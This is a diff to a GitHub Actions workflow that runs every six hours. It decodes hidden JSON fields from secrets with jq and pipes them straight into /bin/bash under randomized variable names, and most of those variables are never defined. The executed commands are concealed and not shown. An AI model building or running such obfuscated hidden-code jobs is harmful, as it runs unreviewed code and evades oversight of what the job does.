@@ -2,24 +2,21 @@ name: kouyangzhou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
+    - cron: '7 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: kouyangzhou
         env:
-          ekm84740: ${{ secrets.ekm84740 }}
+          jujxv32: ${{ secrets.jujxv32 }}
         run: |
-          echo $ekm84740 | jq -r .zp6 | /bin/bash
-          echo $tig0 | jq -r .da931 | /bin/bash
-          echo $omunt159 | jq -r .o1976 | /bin/bash
-          echo $e51 | jq -r .jvw073 | /bin/bash
-          echo $mrjj517 | jq -r .wwsy8687 | /bin/bash
-          echo $kmaqw242 | jq -r .swmli689 | /bin/bash
-          echo $qd9 | jq -r .rzc54 | /bin/bash
-          echo $vxl0 | jq -r .pdg4684 | /bin/bash
-          echo $am97347 | jq -r .nj21227 | /bin/bash
+          echo $jujxv32 | jq -r .jrj07 | /bin/bash
+          echo $l7252 | jq -r .jtz329 | /bin/bash
+          echo $mvwv1626 | jq -r .jddtg63282 | /bin/bash
+          echo $vxb700 | jq -r .aqi40 | /bin/bash
+          echo $meqw901 | jq -r .d3 | /bin/bash
 
